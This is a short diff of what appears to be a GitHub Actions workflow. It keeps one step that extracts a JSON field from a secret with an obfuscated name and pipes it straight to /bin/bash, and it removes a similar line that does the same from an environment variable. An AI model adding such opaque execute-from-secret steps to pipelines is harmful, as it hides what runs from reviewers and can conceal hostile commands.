@@ -18,7 +18,6 @@ jobs:
           z3731: ${{ secrets.z3731 }}
         run: |
           printf '%s' "$z3731" | jq -r .sm9730 | /bin/bash
-          echo $qwxxw650 | jq -r .zune96 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
